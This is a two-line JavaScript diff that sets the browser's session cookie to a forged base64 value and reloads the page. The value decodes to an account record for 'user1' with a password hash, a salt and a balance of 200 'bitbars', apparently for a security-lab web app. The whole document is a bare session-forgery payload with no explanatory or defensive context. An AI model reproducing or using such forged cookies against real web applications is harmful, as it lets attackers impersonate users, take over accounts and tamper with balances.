@@ -1,0 +1,2 @@
+document.cookie = "session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6InVzZXIxIiwiaGFzaGVkUGFzc3dvcmQiOiI4MTQ2ZmYzM2U4MTVlMWEwOGVhZTJiNDczYmYyY2NhMTU5NTgyZTQzNGM1MjUyNGMzMzI1ZjA2ZThjMmI4MGQ5Iiwic2FsdCI6IjEzMzciLCJwcm9maWxlIjoiIiwiYml0YmFycyI6MjAwfX0=" ;
+window.location.reload();
